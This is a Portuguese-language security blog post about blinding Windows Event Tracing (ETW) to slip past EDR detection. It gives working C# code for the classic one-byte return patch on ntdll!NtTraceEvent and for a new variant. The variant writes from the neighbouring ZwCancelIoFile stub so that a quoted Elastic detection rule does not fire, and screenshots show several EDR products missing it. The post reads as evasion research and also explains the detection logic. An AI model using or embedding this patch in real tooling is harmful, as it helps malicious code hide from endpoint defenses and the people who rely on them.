---
title: "Dumb Patches Against Smart Defenses"
date: 2026-05-04 18:00:00 -0300
#categories: [windows]
tags: [windows, windows internals, edr, etw]
#description: Dumb patches against smart defenses
toc: true   # tabela de conteúdo automática na sidebar
---


Não, não é um 0day, é apenas mais um patch entre tantos outros, porém curioso como uma mudança simples numa abordagem já conhecida permite contornar regras específicas em algumas soluções de mercado. 

![meme](/assets/img/posts/post01-01.png)


Mas antes vamos passar por algum conteúdo para entender onde iremos chegar.  
 

## EDR 

O AV tradicional foi projetado principalmente para facilitar a prevenção e detecção de código malicioso usando uma combinação de assinaturas e análise heurística, sendo assim, só conseguia atuar no início da cadeia de ataque. O EDR, no entanto, surgiu com a ideia de mudar esse jogo contra o atacante, podendo detectar e bloquear comportamentos, consequentemente podendo atuar em mais pontos da cadeia de ataque. Como Matt Hand pontua em seu livro Evading EDR "Modern EDRs are complex pieces of software with many sensor components, each of which can be bypassed in its own way". Há uma variedade de métodos que as soluções de EDR utilizam para detectar programas ou comportamentos maliciosos. No mundo corporativo hoje em dia, as principais soluções de mercado normalmente possuem recursos como: 

- Scanner estático 
- Sandbox 
- API Hooking 
- Kernel Callbacks (Process / Threads / Object / Image-Load / Registry Notification) 
- Minifilter Drivers (Filesystem) 
- Network Drivers 
- ETW (Event Tracing for Windows) 
- AMSI (Antimalware Scan Interface) 

Alguns possuem funcionalidades como Driver ELAM (Early Launch Antimalware), entre outras, porém no geral a maioria fica nos itens listados acima. Em resumo, o EDR basicamente funciona coletando várias fontes de telemetria e utilizando uma correlação de ações para decidir se é algo malicioso ou não.  

## ETW (Event Tracing for Windows) 

Nesse post vamos focar em uma dessas fontes de telemetria, o Event Tracing for Windows. O ETW é um recurso do Windows para rastreamento de eventos, permitindo monitorar, diagnosticar e depurar eventos de aplicações em nível de usuário, e drivers em nível de kernel. Por exemplo, ele pode ser utilizado pelo desenvolvedor para registrar e consumir eventos de uma forma eficaz, se mostrando uma alternativa ao estilo clássico de depuração com printf (sou do time Console.WriteLine("debug 1")). 

Existem 3 componentes principais no ETW: 

1. Providers: Responsáveis por emitir os eventos.  
2. Controllers: Definem e controlam as sessões de rastreamento. 
3. Consumers: Recebem os eventos das sessões de rastreamento. 

Os eventos podem ser consumidos através de arquivos de log ou em tempo real. Originalmente, o ETW foi apresentado como um recurso para depuração e monitoramento de desempenho, porém, devido a sua eficiência e por já ser um mecanismo nativo, algumas soluções de EDR passaram a utilizá-lo como fonte de telemetria.  

Nota: O conteúdo a seguir foca apenas nos eventos gerados em user land, e não no Provider ETW-TI em kernel land.


## Patching 

Apesar de ser um mecanismo robusto, o ETW tem suas limitações, principalmente porque inicialmente não foi pensado como uma fonte de telemetria para soluções de segurança. Ao longo dos últimos anos, os operadores ofensivos vêm publicando diversas formas de manipular a entrega dos eventos para as ferramentas defensivas, dentre elas a mais comum é o patching da função responsável por relatar os eventos, como por exemplo ntdll!EtwEventWrite() ou ntdll!NtTraceEvent() que faz a transição para kernel mode via syscall. A finalidade é que o processo malicioso, em seu próprio contexto de memória, silencie os Providers do sistema que normalmente reportariam sua atividade para o Consumer (EDR).

Basicamente é obtido o endereço em memória da função responsável pelo envio dos eventos, alterada a permissão no endereço obtido para que seja possível escrever, e copiado o patch para o entrypoint, que irá alterar o fluxo da função, fazendo com que a função retorne imediatamente ao ser chamada. 

```  
static void OldBlindETW() {
	IntPtr ntdll = LoadLibrary("ntdll.dll");
	IntPtr ntTraceEvent = GetProcAddress(ntdll, "NtTraceEvent");
	
	UInt32 dwOld = 0;
	
	VirtualProtect(ntTraceEvent, (UInt32)0x1, 0x40, ref dwOld);
	
	byte[] patch = new byte[] { 0xC3 };
	
	Marshal.Copy(patch, 0, ntTraceEvent, patch.Length);
	
	VirtualProtect(ntTraceEvent, (UInt32)0x1, 0x20, ref dwOld);
}
```

![x64dbg1](/assets/img/posts/post01-02.png)

Por já ser um método bem batido dentre as técnicas contra os EDRs, existem regras específicas para detectar esse conjunto de ações como comportamento malicioso. 

![edr1](/assets/img/posts/post01-03.png)

![edr2](/assets/img/posts/post01-04.png)

Analisando a forma como esse comportamento é acionado, principalmente após ler o [artigo](https://www.elastic.co/security-labs/doubling-down-etw-callstacks) da Elastic mostrando a regra, lembrei do conceito explorado no Hell's Gate de usar funções vizinhas não hookadas na ntdll, técnica que se apoia na estrutura previsível dos stubs de syscalls mantendo uma consistência relativa entre chamadas adjacentes (32 bytes). A partir disso, resolvi utilizar o mesmo princípio de previsibilidade para aplicá-lo em uma nova abordagem para o patch.

```
api where process.Ext.api.name :  "WriteProcessMemory*" and 

process.Ext.api.summary : ("*ntdll.dll!Etw*", "*ntdll.dll!NtTrace*") and 

not process.executable : ("?:\\Windows\\System32\\lsass.exe", "\\Device\\HarddiskVolume*\\Windows\\System32\\lsass.exe")
```

Entendendo que a regra é acionada ao escrever em um endereço de memória referente às funções já conhecidas para a execução do patch, como a ntdll!NtTraceEvent(), resolvi testar o seguinte fluxo:

1. Obter o endereço de memória da ntdll!NtTraceEvent() normalmente, como nos patches já conhecidos.
2. Subtrair 32 bytes desse endereço para encontrar a função anterior na ntdll, no nosso caso ntdll!ZwCancelIoFile().
3. Em vez de alterar a permissão de escrita no endereço da ntdll!NtTraceEvent(), alterar a permissão a partir do início da ntdll!ZwCancelIoFile(), deslocando o ponto de início do VirtualProtect para fora do endereço monitorado pela regra.
4. Escrever um patch de 33 bytes: os primeiros 32 são uma cópia dos bytes originais da ntdll!ZwCancelIoFile(), preservando seu funcionamento intacto. O último byte, já dentro da ntdll!NtTraceEvent(), é o patch em si.
5. Ao escrever no endereço de memória, utilizar a referência da ntdll!ZwCancelIoFile() como ponto de escrita, não acionando a regra de detecção.

![x64dbg2](/assets/img/posts/post01-05.png)

```
static void BlindETW()
{
    IntPtr ntdll = LoadLibrary("ntdll.dll");
    IntPtr addr = GetProcAddress(ntdll, "NtTraceEvent");

    IntPtr addrFinal = addr - 0x20;
    IntPtr addrCopy = addrFinal;

    byte[] buffer = new byte[32];
    Marshal.Copy(addr, buffer, 0, 0x20);

    byte[] oldPatch = new byte[] { 0xC3 };

    byte[] newPatch = new byte[buffer.Length + oldPatch.Length];

    Buffer.BlockCopy(buffer, 0, newPatch, 0, buffer.Length);
    Buffer.BlockCopy(oldPatch, 0, newPatch, buffer.Length, oldPatch.Length);

    UInt32 dwOld = 0;
    VirtualProtect(addrFinal, (UIntPtr)0x1, 0x40, out dwOld);

    Marshal.Copy(newPatch, 0, addrCopy, newPatch.Length);

    VirtualProtect(addrCopy, (UIntPtr)0x1, 0x20, out dwOld);
}
```

A aba .NET assemblies do Process Hacker utiliza o ETW para obter informações de assemblies carregados dentro de um processo, e como pode ser visto abaixo, o patch funcionou.

![assemblie](/assets/img/posts/post01-06.png)

Agora vamos por a prova contra os EDRs novamente.

![edr3](/assets/img/posts/post01-07.png)

![edr4](/assets/img/posts/post01-08.png)

![edr5](/assets/img/posts/post01-09.png)

Nota: Duas das soluções de EDR mostradas durante esse post não estavam atualizadas, pode ser que com novas regras esse método de patch também seja detectado.


–[ Últimos pensamentos

Tentei mostrar nesse post que uma mudança pequena numa abordagem já conhecida foi suficiente para contornar regras específicas. Não porque o EDR é fraco, mas porque regras baseadas em endereços fixos são por natureza frágeis diante de pequenas variações.

Embora funcional para os testes executados, como tentei explicar na seção sobre o EDR, essa é apenas uma parte do quebra-cabeça que é o tema evasão de EDR, onde soluções diferentes possuem recursos diferentes, às vezes até a mesma solução tem um comportamento diferente em ambientes diferentes e principalmente com atualizações diferentes. Considero que o tema não é tão simples como o Linkedin faz parecer, sou descrente com o termo FUD, ao mesmo tempo (((que por experiência própria, sei))) sabemos que não existe ferramenta 100% eficaz. Acredito até que as soluções EDR estão num caminho que faz sentido, tentando coletar telemetria de várias fontes possíveis, com a consciência (espero ¯\\(ツ)/¯) de que uma delas pode ser facilmente contornada.

Para maiores detalhes e caso queira se aprofundar no tema, as referências utilizadas nesse post estão listadas abaixo.


--[ Referencias

https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing 
https://nostarch.com/evading-edr 
https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ 
https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/ 
https://jonny-johnson.medium.com/understanding-etw-patching-9f5af87f9d7b 
https://www.elastic.co/security-labs/doubling-down-etw-callstacks
